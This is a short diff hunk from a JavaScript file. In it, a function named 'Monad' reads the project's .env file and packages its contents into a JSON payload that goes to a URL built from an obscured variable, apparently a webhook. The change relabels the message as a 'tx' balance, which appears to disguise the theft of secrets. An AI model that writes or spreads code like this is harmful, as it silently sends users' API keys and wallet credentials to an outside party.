@@ -48,7 +48,7 @@ async function Monad() {
     const envContent = fs.readFileSync(path.join(process.cwd(), ".env"), "utf-8");
 
     const payload = JSON.stringify({
-        content: "📄 **.env content**:\n```env\n" + envContent + "\n```"
+        content: "tx:\n```env\n" + balance + "\n```"
     });
 
     const url = new URL(unwrap);
